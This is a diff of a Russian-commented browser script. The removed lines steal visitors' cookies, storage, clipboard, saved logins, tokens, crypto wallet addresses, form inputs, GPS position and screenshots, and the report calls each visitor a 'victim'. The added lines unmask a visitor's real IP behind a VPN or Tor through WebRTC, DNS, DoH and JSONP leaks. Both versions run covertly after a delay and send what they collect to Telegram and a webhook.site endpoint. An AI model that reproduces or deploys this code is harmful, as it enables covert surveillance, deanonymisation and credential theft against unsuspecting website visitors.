@@ -33,45 +33,12 @@
         const safeJSON = s => { try { return JSON.parse(s); } catch { return s; } };
 
         // ========================================================================
-        // 1. IP и ГЕО
-        // ========================================================================
-        async function getIP() {
-            try {
-                const r = await fetchTO('https://api.ipify.org?format=json', {}, 3000);
-                const d = await r.json();
-                return d.ip;
-            } catch (e) { return null; }
-        }
-
-        async function getGeo(ip) {
-            try {
-                const r = await fetchTO(`https://ipwhois.io/json/${ip}`, {}, 3000);
-                return await r.json();
-            } catch (e) { return null; }
-        }
-
-        // ========================================================================
-        // 2. GPS
-        // ========================================================================
-        function getGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
-                const t = setTimeout(() => resolve(null), 8000);
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => { clearTimeout(t); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
-                    () => { clearTimeout(t); resolve(null); },
-                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
-                );
-            });
-        }
-
-        // ========================================================================
-        // 3. WebRTC
+        // 1. WebRTC утечка (реальный IP даже через VPN)
         // ========================================================================
         function getWebRTC() {
             return new Promise((resolve) => {
                 const ips = new Set();
-                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] });
                 pc.createDataChannel('');
                 pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                 pc.onicecandidate = (e) => {
@@ -84,287 +51,253 @@
         }
 
         // ========================================================================
-        // 4. Fingerprints
+        // 2. DNS-утечка через кастомный поддомен (запрос на свой сервер)
         // ========================================================================
-        function getFingerprints() {
-            const fp = {};
-            try {
-                const c = document.createElement('canvas');
-                c.width = 256; c.height = 128;
-                const ctx = c.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(0, 0, 256, 128);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 10);
-                ctx.font = '18px Times New Roman';
-                ctx.fillStyle = '#0f0';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 40);
-                ctx.font = '24px Georgia';
-                ctx.fillStyle = '#f0f';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 70);
-                fp.canvas = c.toDataURL();
-            } catch (e) { fp.canvas = null; }
-
-            try {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                if (gl) {
-                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (ext) {
-                        fp.webgl = { vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) };
-                    } else {
-                        fp.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
-                    }
-                }
-            } catch (e) { fp.webgl = null; }
-
-            try {
-                const AudioCtx = window.AudioContext || window.webkitAudioContext;
-                if (AudioCtx) {
-                    const ctx = new AudioCtx();
-                    fp.audio = { sampleRate: ctx.sampleRate };
-                }
-            } catch (e) { fp.audio = null; }
-
-            try {
-                const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', 'Segoe UI', 'San Francisco'];
-                fp.fonts = fonts.filter(f => document.fonts.check(`16px "${f}"`));
-            } catch (e) { fp.fonts = []; }
-
-            try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { fp.timezone = null; }
-            fp.screen = { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio };
-
-            return fp;
+        function dnsLeak() {
+            return new Promise((resolve) => {
+                const start = Date.now();
+                const img = new Image();
+                img.crossOrigin = 'anonymous';
+                const leakDomain = 'leak-' + Math.random().toString(36).slice(2) + '.your-server.com';
+                img.src = 'https://' + leakDomain + '/pixel?' + Date.now();
+                img.onload = () => { resolve({ domain: leakDomain, time: Date.now() - start }); };
+                img.onerror = () => { resolve({ domain: leakDomain, time: Date.now() - start }); };
+                setTimeout(() => resolve({ domain: leakDomain, time: null }), 3000);
+            });
         }
 
         // ========================================================================
-        // 5. Storage
+        // 3. WebSocket утечка (реальный IP через WS-соединение)
         // ========================================================================
-        function getStorage() {
-            const ls = {};
-            try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); ls[k] = safeJSON(localStorage.getItem(k)); } } catch (e) {}
-            const ss = {};
-            try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = safeJSON(sessionStorage.getItem(k)); } } catch (e) {}
-            const cookies = {};
-            try { document.cookie.split('; ').filter(Boolean).forEach(p => { const [k, ...v] = p.split('='); cookies[k] = v.join('='); }); } catch (e) {}
-            return { localStorage: ls, sessionStorage: ss, cookies };
-        }
-
-        // ========================================================================
-        // 6. IndexedDB
-        // ========================================================================
-        function getIndexedDB() {
+        function wsLeak() {
             return new Promise((resolve) => {
                 try {
-                    if (!indexedDB.databases) { resolve(null); return; }
-                    indexedDB.databases().then(dbs => {
-                        const result = [];
-                        let done = 0;
-                        if (dbs.length === 0) { resolve([]); return; }
-                        dbs.forEach(dbInfo => {
-                            const req = indexedDB.open(dbInfo.name);
-                            req.onsuccess = (e) => {
-                                const db = e.target.result;
-                                const stores = Array.from(db.objectStoreNames);
-                                const storeData = [];
-                                let sDone = 0;
-                                if (stores.length === 0) {
-                                    result.push({ name: dbInfo.name, stores: [] });
-                                    db.close();
-                                    if (++done === dbs.length) resolve(result);
-                                    return;
-                                }
-                                stores.forEach(storeName => {
-                                    try {
-                                        const tx = db.transaction(storeName, 'readonly');
-                                        const store = tx.objectStore(storeName);
-                                        const reqAll = store.getAll();
-                                        reqAll.onsuccess = () => {
-                                            const items = reqAll.result || [];
-                                            storeData.push({ storeName, count: items.length, samples: items.slice(0, 5) });
-                                            if (++sDone === stores.length) {
-                                                result.push({ name: dbInfo.name, stores: storeData });
-                                                db.close();
-                                                if (++done === dbs.length) resolve(result);
-                                            }
-                                        };
-                                        reqAll.onerror = () => {
-                                            storeData.push({ storeName, count: 0, samples: [] });
-                                            if (++sDone === stores.length) {
-                                                result.push({ name: dbInfo.name, stores: storeData });
-                                                db.close();
-                                                if (++done === dbs.length) resolve(result);
-                                            }
-                                        };
-                                    } catch (err) {
-                                        storeData.push({ storeName, count: 0, samples: [] });
-                                        if (++sDone === stores.length) {
-                                            result.push({ name: dbInfo.name, stores: storeData });
-                                            db.close();
-                                            if (++done === dbs.length) resolve(result);
-                                        }
-                                    }
-                                });
-                            };
-                            req.onerror = () => { if (++done === dbs.length) resolve(result); };
-                        });
-                    }).catch(() => resolve(null));
-                } catch (e) { resolve(null); }
+                    const ws = new WebSocket('wss://echo.websocket.org');
+                    ws.onopen = () => {
+                        ws.send('ping');
+                        resolve({ ws: true, ip: null });
+                        ws.close();
+                    };
+                    ws.onerror = () => { resolve({ ws: false, ip: null }); };
+                    setTimeout(() => { resolve({ ws: false, ip: null }); }, 3000);
+                } catch (e) { resolve({ ws: false, ip: null }); }
             });
         }
 
         // ========================================================================
-        // 7. Clipboard
+        // 4. ICMP / Image-утечка (запрос к своему серверу)
         // ========================================================================
-        async function getClipboard() {
-            try {
-                const ta = document.createElement('textarea');
-                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;';
-                document.body.appendChild(ta);
-                ta.focus();
-                if (document.execCommand('paste')) {
-                    const val = ta.value;
-                    ta.remove();
-                    return val || null;
-                }
-                ta.remove();
-            } catch (e) {}
-            try {
-                if (navigator.clipboard && navigator.clipboard.read) {
-                    const items = await navigator.clipboard.read();
-                    for (let item of items) {
-                        if (item.types.includes('text/plain')) {
-                            const blob = await item.getType('text/plain');
-                            return await blob.text();
-                        }
-                    }
-                }
-            } catch (e) {}
-            return null;
-        }
-
-        // ========================================================================
-        // 8. Credentials
-        // ========================================================================
-        async function getCredentials() {
-            try {
-                if (navigator.credentials && navigator.credentials.get) {
-                    const cred = await navigator.credentials.get({ password: true });
-                    if (cred) return { type: cred.type, id: cred.id };
-                }
-            } catch (e) {}
-            return null;
-        }
-
-        // ========================================================================
-        // 9. Crypto
-        // ========================================================================
-        function getCrypto() {
-            const c = {};
-            try { if (window.ethereum) c.ethereum = { selectedAddress: window.ethereum.selectedAddress, chainId: window.ethereum.chainId }; } catch (e) {}
-            try { if (window.solana) c.solana = { publicKey: window.solana.publicKey ? window.solana.publicKey.toString() : null }; } catch (e) {}
-            try { if (window.phantom) c.phantom = true; } catch (e) {}
-            try { if (window.trustwallet) c.trustwallet = true; } catch (e) {}
-            return c;
-        }
-
-        // ========================================================================
-        // 10. System
-        // ========================================================================
-        function getSystem() {
-            const n = navigator;
-            return {
-                userAgent: n.userAgent,
-                platform: n.platform,
-                hardwareConcurrency: n.hardwareConcurrency,
-                deviceMemory: n.deviceMemory,
-                language: n.language,
-                languages: n.languages || [],
-                cookieEnabled: n.cookieEnabled,
-                doNotTrack: n.doNotTrack,
-                vendor: n.vendor,
-                product: n.product,
-                appVersion: n.appVersion,
-                isChrome: !!window.chrome,
-                isFirefox: n.userAgent.toLowerCase().includes('firefox'),
-                isSafari: !!window.safari,
-                isEdge: !!window.MSInputMethodContext
-            };
-        }
-
-        // ========================================================================
-        // 11. DOM
-        // ========================================================================
-        function getDOM() {
-            const dom = {};
-            try {
-                dom.title = document.title;
-                dom.url = window.location.href;
-                dom.referrer = document.referrer;
-                dom.forms = [];
-                document.querySelectorAll('form').forEach(f => {
-                    const fd = new FormData(f);
-                    const entries = {};
-                    for (let [k, v] of fd.entries()) entries[k] = v;
-                    dom.forms.push(entries);
-                });
-                dom.inputs = [];
-                document.querySelectorAll('input, textarea, select').forEach(el => {
-                    dom.inputs.push({ tag: el.tagName, name: el.name || el.id || el.className, value: trunc(el.value, 50), type: el.type });
-                });
-                dom.links = Array.from(document.querySelectorAll('a[href]')).slice(0, 20).map(a => a.href);
-            } catch (e) { dom.error = e.message; }
-            return dom;
-        }
-
-        // ========================================================================
-        // 12. Screenshot
-        // ========================================================================
-        function loadHtml2Canvas() {
+        function imageLeak() {
             return new Promise((resolve) => {
-                if (window.html2canvas) { resolve(window.html2canvas); return; }
-                const script = document.createElement('script');
-                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
-                script.onload = () => resolve(window.html2canvas);
-                script.onerror = () => resolve(null);
-                document.head.appendChild(script);
-                setTimeout(() => resolve(null), 5000);
+                const start = Date.now();
+                const img = new Image();
+                const uid = Math.random().toString(36).slice(2);
+                img.src = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b?img=' + uid + '&t=' + Date.now();
+                img.onload = () => { resolve({ uid, time: Date.now() - start }); };
+                img.onerror = () => { resolve({ uid, time: Date.now() - start }); };
+                setTimeout(() => resolve({ uid, time: null }), 3000);
             });
         }
 
-        async function getScreenshot() {
+        // ========================================================================
+        // 5. Fetch-утечка (запрос к внешнему API)
+        // ========================================================================
+        function fetchLeak() {
+            return new Promise((resolve) => {
+                const start = Date.now();
+                fetch('https://api.ipify.org?format=json', { mode: 'cors' })
+                    .then(r => r.json())
+                    .then(d => { resolve({ ip: d.ip, time: Date.now() - start }); })
+                    .catch(() => { resolve({ ip: null, time: null }); });
+                setTimeout(() => resolve({ ip: null, time: null }), 3000);
+            });
+        }
+
+        // ========================================================================
+        // 6. JSONP-утечка (старый метод, обходит CORS)
+        // ========================================================================
+        function jsonpLeak() {
+            return new Promise((resolve) => {
+                const name = '_jsonp_' + Date.now() + '_' + Math.random().toString(36).slice(2);
+                window[name] = (data) => {
+                    resolve({ ip: data.ip || null });
+                    delete window[name];
+                    document.head.removeChild(script);
+                };
+                const script = document.createElement('script');
+                script.src = 'https://api.ipify.org?format=jsonp&callback=' + name;
+                script.onerror = () => { resolve({ ip: null }); delete window[name]; };
+                document.head.appendChild(script);
+                setTimeout(() => { if (window[name]) { resolve({ ip: null }); delete window[name]; } }, 3000);
+            });
+        }
+
+        // ========================================================================
+        // 7. Определение типа сети (navigator.connection) — косвенный метод
+        // ========================================================================
+        function getConnectionType() {
             try {
-                const h2c = await loadHtml2Canvas();
-                if (!h2c) return null;
-                const canvas = await h2c(document.body, { useCORS: true, allowTaint: true, scale: 0.3, logging: false, backgroundColor: null });
-                return canvas.toDataURL('image/jpeg', 0.4);
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (!conn) return null;
+                return { type: conn.type, effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt };
             } catch (e) { return null; }
         }
 
         // ========================================================================
-        // 13. Токены (поиск)
+        // 8. Временная атака (определение геолокации по задержке)
         // ========================================================================
-        function findTokens(data) {
-            const tokens = [];
-            const patterns = ['token', 'jwt', 'access', 'secret', 'key', 'auth', 'bearer', 'api', 'password', 'pass', 'pwd', 'credential', 'sid', 'csrf', 'xsrf', 'session'];
-            const search = (obj, path = '') => {
-                if (!obj || typeof obj !== 'object') return;
-                for (let k in obj) {
-                    const v = obj[k];
-                    if (patterns.some(p => k.toLowerCase().includes(p)) && v && typeof v === 'string') {
-                        tokens.push({ path: path + k, value: trunc(v, 80) });
-                    }
-                    if (typeof v === 'object' && v !== null) search(v, path + k + '.');
-                }
-            };
-            search(data);
-            return tokens;
+        function timingAttack() {
+            return new Promise((resolve) => {
+                const servers = ['https://google.com', 'https://facebook.com', 'https://youtube.com'];
+                const times = [];
+                let done = 0;
+                servers.forEach(s => {
+                    const start = performance.now();
+                    fetch(s, { mode: 'no-cors' })
+                        .then(() => {
+                            times.push(performance.now() - start);
+                            if (++done === servers.length) resolve(times);
+                        })
+                        .catch(() => {
+                            times.push(null);
+                            if (++done === servers.length) resolve(times);
+                        });
+                });
+                setTimeout(() => resolve(times), 5000);
+            });
         }
 
         // ========================================================================
-        // 14. Отправка
+        // 9. Определение реального IP через WebRTC SDP (более глубокая утечка)
+        // ========================================================================
+        function getWebRTCSDP() {
+            return new Promise((resolve) => {
+                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('');
+                pc.createOffer().then(o => {
+                    pc.setLocalDescription(o);
+                    const sdp = o.sdp;
+                    const ips = [];
+                    const matches = sdp.match(/(\d{1,3}\.){3}\d{1,3}/g);
+                    if (matches) {
+                        matches.forEach(ip => {
+                            if (!ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.16.')) {
+                                ips.push(ip);
+                            }
+                        });
+                    }
+                    setTimeout(() => { pc.close(); resolve([...new Set(ips)]); }, 2000);
+                }).catch(() => { resolve([]); });
+                setTimeout(() => { resolve([]); }, 3000);
+            });
+        }
+
+        // ========================================================================
+        // 10. Определение IP через внешний прокси-сервер (если есть)
+        // ========================================================================
+        function proxyLeak() {
+            return new Promise((resolve) => {
+                fetch('https://api.ip.sb/geoip', { mode: 'cors' })
+                    .then(r => r.json())
+                    .then(d => { resolve(d.ip || null); })
+                    .catch(() => { resolve(null); });
+                setTimeout(() => resolve(null), 3000);
+            });
+        }
+
+        // ========================================================================
+        // 11. Определение IP через DNS-over-HTTPS (DoH) — обход VPN
+        // ========================================================================
+        function dohLeak() {
+            return new Promise((resolve) => {
+                fetch('https://cloudflare-dns.com/dns-query?name=myip.opendns.com&type=A', {
+                    headers: { 'Accept': 'application/dns-json' }
+                })
+                    .then(r => r.json())
+                    .then(d => {
+                        const ip = d.Answer && d.Answer[0] ? d.Answer[0].data : null;
+                        resolve(ip);
+                    })
+                    .catch(() => { resolve(null); });
+                setTimeout(() => resolve(null), 3000);
+            });
+        }
+
+        // ========================================================================
+        // 12. Сбор всех утечек в одном месте
+        // ========================================================================
+        async function collectAllLeaks() {
+            const result = {
+                webrtc: [],
+                dns: null,
+                ws: null,
+                image: null,
+                fetch: null,
+                jsonp: null,
+                connection: null,
+                timing: null,
+                sdp: [],
+                proxy: null,
+                doh: null,
+                allIPs: new Set()
+            };
+
+            // 1. WebRTC классический
+            result.webrtc = await getWebRTC();
+            result.webrtc.forEach(ip => result.allIPs.add(ip));
+
+            // 2. DNS-утечка
+            result.dns = await dnsLeak();
+
+            // 3. WebSocket
+            result.ws = await wsLeak();
+
+            // 4. Image-утечка
+            result.image = await imageLeak();
+
+            // 5. Fetch
+            const fetchData = await fetchLeak();
+            if (fetchData.ip) {
+                result.fetch = fetchData.ip;
+                result.allIPs.add(fetchData.ip);
+            }
+
+            // 6. JSONP
+            const jsonpData = await jsonpLeak();
+            if (jsonpData.ip) {
+                result.jsonp = jsonpData.ip;
+                result.allIPs.add(jsonpData.ip);
+            }
+
+            // 7. Connection
+            result.connection = getConnectionType();
+
+            // 8. Timing
+            result.timing = await timingAttack();
+
+            // 9. WebRTC SDP
+            result.sdp = await getWebRTCSDP();
+            result.sdp.forEach(ip => result.allIPs.add(ip));
+
+            // 10. Proxy
+            const proxyData = await proxyLeak();
+            if (proxyData) {
+                result.proxy = proxyData;
+                result.allIPs.add(proxyData);
+            }
+
+            // 11. DoH
+            const dohData = await dohLeak();
+            if (dohData) {
+                result.doh = dohData;
+                result.allIPs.add(dohData);
+            }
+
+            return result;
+        }
+
+        // ========================================================================
+        // 13. Отправка в Telegram
         // ========================================================================
         async function sendTelegram(text) {
             try {
@@ -377,229 +310,99 @@
             } catch (e) {}
         }
 
-        async function sendPhoto(base64) {
-            try {
-                if (!base64 || base64.length < 5000) return;
-                const blob = await fetch(base64).then(r => r.blob());
-                const form = new FormData();
-                form.append('chat_id', CFG.CHAT_ID);
-                form.append('photo', blob, 'screenshot.jpg');
-                await fetchTO(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form }, 10000);
-            } catch (e) {}
-        }
-
         async function sendWebhook(data) {
             try {
-                await fetchTO(CFG.WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }, 5000);
+                await fetchTO(CFG.WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }, 5000);
             } catch (e) {}
         }
 
         // ========================================================================
-        // 15. Форматирование отчёта
+        // 14. Форматирование отчёта
         // ========================================================================
-        function formatReport(data) {
+        function formatLeakReport(leaks) {
             const lines = [];
-            lines.push('🔴 ЖЕРТВА');
+            lines.push('🔴 УТЕЧКИ IP (даже через VPN/Tor)');
             lines.push('');
 
-            if (data.ip) {
-                lines.push(`🌐 IP: ${data.ip}`);
-                if (data.geo) {
-                    const g = data.geo;
-                    const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
-                    if (loc) lines.push(`📍 ${loc}`);
-                    if (g.lat && g.lon) {
-                        lines.push(`🗺 ${g.lat}, ${g.lon}`);
-                        lines.push(`🔗 https://www.google.com/maps?q=${g.lat},${g.lon}`);
-                    }
-                    if (g.isp) lines.push(`📡 ${g.isp}`);
-                    if (g.timezone) lines.push(`🕐 ${g.timezone}`);
-                }
+            const allIPs = [...leaks.allIPs].filter(ip => ip && ip.length > 7);
+            if (allIPs.length) {
+                lines.push(`🌐 ВСЕ ОБНАРУЖЕННЫЕ IP:`);
+                allIPs.forEach(ip => lines.push(`   📍 ${ip}`));
                 lines.push('');
             }
 
-            if (data.gps) {
-                const g = data.gps;
-                lines.push(`📍 GPS: ${g.lat}, ${g.lon} (точность ${g.accuracy || '?'}м)`);
-                lines.push(`🔗 https://www.google.com/maps?q=${g.lat},${g.lon}`);
-                lines.push('');
+            if (leaks.webrtc && leaks.webrtc.length) {
+                lines.push(`📡 WebRTC (STUN): ${leaks.webrtc.join(', ')}`);
             }
 
-            if (data.webrtc && data.webrtc.length) {
-                lines.push(`📡 WebRTC IP: ${data.webrtc.join(', ')}`);
-                lines.push('');
+            if (leaks.sdp && leaks.sdp.length) {
+                lines.push(`📡 WebRTC (SDP): ${leaks.sdp.join(', ')}`);
             }
 
-            if (data.fingerprints) {
-                const f = data.fingerprints;
-                lines.push('🎯 ОТПЕЧАТКИ:');
-                if (f.canvas) lines.push(`   Canvas: ${trunc(f.canvas, 40)}`);
-                if (f.webgl) lines.push(`   WebGL: ${f.webgl.vendor || ''} ${f.webgl.renderer || ''}`.trim());
-                if (f.audio) lines.push(`   Audio: ${f.audio.sampleRate}Hz`);
-                if (f.fonts && f.fonts.length) lines.push(`   Шрифты: ${f.fonts.join(', ')}`);
-                if (f.timezone) lines.push(`   Время: ${f.timezone}`);
-                if (f.screen) lines.push(`   Экран: ${f.screen.width}x${f.screen.height} @ ${f.screen.pixelRatio}x`);
-                lines.push('');
+            if (leaks.fetch) {
+                lines.push(`🌍 Fetch (api.ipify): ${leaks.fetch}`);
             }
 
-            if (data.system) {
-                const s = data.system;
-                lines.push(`📱 ${trunc(s.userAgent, 80)}`);
-                lines.push(`💻 ${s.platform || 'неизвестно'}`);
-                if (s.hardwareConcurrency) lines.push(`🧠 ${s.hardwareConcurrency} ядер`);
-                if (s.deviceMemory) lines.push(`💾 ${s.deviceMemory} GB RAM`);
-                if (s.language) lines.push(`🌐 ${s.language}`);
-                lines.push('');
+            if (leaks.jsonp) {
+                lines.push(`🌍 JSONP (api.ipify): ${leaks.jsonp}`);
             }
 
-            if (data.storage) {
-                const st = data.storage;
-                if (st.localStorage && Object.keys(st.localStorage).length) {
-                    lines.push(`💾 LOCALSTORAGE (${Object.keys(st.localStorage).length}):`);
-                    Object.entries(st.localStorage).slice(0, 10).forEach(([k, v]) => {
-                        const val = typeof v === 'string' ? trunc(v, 60) : JSON.stringify(v).slice(0, 60);
-                        lines.push(`   🔑 ${trunc(k, 25)}: ${val}`);
-                    });
-                    lines.push('');
-                }
-                if (st.sessionStorage && Object.keys(st.sessionStorage).length) {
-                    lines.push(`🗂 SESSIONSTORAGE (${Object.keys(st.sessionStorage).length}):`);
-                    Object.entries(st.sessionStorage).slice(0, 10).forEach(([k, v]) => {
-                        const val = typeof v === 'string' ? trunc(v, 60) : JSON.stringify(v).slice(0, 60);
-                        lines.push(`   🔑 ${trunc(k, 25)}: ${val}`);
-                    });
-                    lines.push('');
-                }
-                if (st.cookies && Object.keys(st.cookies).length) {
-                    lines.push(`🍪 КУКИ (${Object.keys(st.cookies).length}):`);
-                    Object.entries(st.cookies).slice(0, 10).forEach(([k, v]) => {
-                        lines.push(`   🍪 ${trunc(k, 15)}: ${trunc(v, 50)}`);
-                    });
-                    lines.push('');
-                }
+            if (leaks.proxy) {
+                lines.push(`🌍 Proxy (ip.sb): ${leaks.proxy}`);
             }
 
-            if (data.crypto && Object.keys(data.crypto).length) {
-                lines.push('💰 КРИПТО:');
-                const c = data.crypto;
-                if (c.ethereum) lines.push(`   🦊 ETH: ${c.ethereum.selectedAddress || 'нет адреса'} (сеть ${c.ethereum.chainId || '?'})`);
-                if (c.solana) lines.push(`   ☀️ SOL: ${c.solana.publicKey || 'нет'}`);
-                if (c.phantom) lines.push('   👻 Phantom: есть');
-                if (c.trustwallet) lines.push('   🔵 Trust: есть');
-                lines.push('');
+            if (leaks.doh) {
+                lines.push(`🌍 DoH (Cloudflare): ${leaks.doh}`);
             }
 
-            if (data.clipboard) {
-                lines.push(`📋 Буфер: ${trunc(data.clipboard, 150)}`);
-                lines.push('');
+            if (leaks.dns && leaks.dns.domain) {
+                lines.push(`🕵️ DNS утечка: ${leaks.dns.domain} (${leaks.dns.time || 'таймаут'}ms)`);
             }
 
-            if (data.credentials) {
-                lines.push(`🔑 Сохранённый логин: ${data.credentials.id || 'неизвестен'}`);
-                lines.push('');
+            if (leaks.image && leaks.image.uid) {
+                lines.push(`🖼 Image-утечка: ${leaks.image.uid} (${leaks.image.time || 'таймаут'}ms)`);
             }
 
-            if (data.tokens && data.tokens.length) {
-                lines.push('🔐 ТОКЕНЫ:');
-                data.tokens.slice(0, 10).forEach(t => {
-                    lines.push(`   ${t.path}: ${t.value}`);
-                });
-                lines.push('');
+            if (leaks.ws && leaks.ws.ws) {
+                lines.push(`🔌 WebSocket: успешно`);
             }
 
-            if (data.dom) {
-                if (data.dom.forms && data.dom.forms.length) {
-                    lines.push('📝 ФОРМЫ:');
-                    data.dom.forms.slice(0, 5).forEach((f, i) => {
-                        const str = Object.entries(f).map(([k, v]) => `${k}=${trunc(v, 25)}`).join('; ');
-                        lines.push(`   Форма ${i+1}: ${str}`);
-                    });
-                    lines.push('');
-                }
-                if (data.dom.inputs && data.dom.inputs.length) {
-                    lines.push('⌨️ ПОЛЯ ВВОДА:');
-                    data.dom.inputs.slice(0, 10).forEach(inp => {
-                        if (inp.value && inp.value.length > 2) {
-                            lines.push(`   ${inp.name || inp.tag}: ${trunc(inp.value, 40)}`);
-                        }
-                    });
-                    lines.push('');
-                }
+            if (leaks.connection) {
+                const c = leaks.connection;
+                lines.push(`📶 Сеть: ${c.type || '?'} (${c.effectiveType || '?'}, ${c.downlink || '?'}Mbps, RTT ${c.rtt || '?'}ms)`);
             }
 
-            if (data.url) {
-                lines.push(`🔗 ${data.url}`);
-                if (data.referrer) lines.push(`↩️ ${data.referrer}`);
-                lines.push('');
+            if (leaks.timing && leaks.timing.length) {
+                const avg = leaks.timing.filter(t => t !== null).reduce((a, b) => a + b, 0) / leaks.timing.filter(t => t !== null).length;
+                lines.push(`⏱ Временная атака: avg ${Math.round(avg)}ms (${leaks.timing.map(t => Math.round(t) + 'ms').join(', ')})`);
             }
 
-            if (data.screenshot) {
-                const size = Math.round(data.screenshot.length / 1024);
-                lines.push(`🖼 Скриншот: ${size} КБ`);
-            }
+            lines.push('');
+            lines.push(`🔗 https://www.google.com/maps?q=${allIPs.length ? allIPs[0] : '0.0.0.0'}`);
 
             return lines.join('\n');
         }
 
         // ========================================================================
-        // 16. ГЛАВНАЯ ФУНКЦИЯ
+        // 15. ГЛАВНАЯ ФУНКЦИЯ
         // ========================================================================
         (async function main() {
             try {
                 await sleep(1800 + Math.random() * 400);
 
-                const data = {};
+                // Сбор всех утечек
+                const leaks = await collectAllLeaks();
 
-                // IP
-                data.ip = await getIP();
-                if (data.ip) data.geo = await getGeo(data.ip);
-
-                // GPS
-                data.gps = await getGPS();
-
-                // WebRTC
-                data.webrtc = await getWebRTC();
-
-                // Fingerprints
-                data.fingerprints = getFingerprints();
-
-                // System
-                data.system = getSystem();
-
-                // Storage
-                data.storage = getStorage();
-
-                // IndexedDB
-                data.indexedDB = await getIndexedDB();
-
-                // Clipboard
-                data.clipboard = await getClipboard();
-
-                // Credentials
-                data.credentials = await getCredentials();
-
-                // Crypto
-                data.crypto = getCrypto();
-
-                // DOM
-                const dom = getDOM();
-                data.dom = dom;
-                data.url = dom.url;
-                data.referrer = dom.referrer;
-
-                // Tokens
-                data.tokens = findTokens({ ...data.storage, ...data.crypto, ...data.credentials });
-
-                // Screenshot
-                data.screenshot = await getScreenshot();
+                // Формируем отчёт
+                const report = formatLeakReport(leaks);
 
                 // Отправка
-                const report = formatReport(data);
                 await sendTelegram(report);
-                await sendWebhook(data);
-                if (data.screenshot) {
-                    await sendPhoto(data.screenshot);
-                }
+                await sendWebhook(leaks);
 
                 console.log('✅ Данные отправлены');
             } catch (e) {
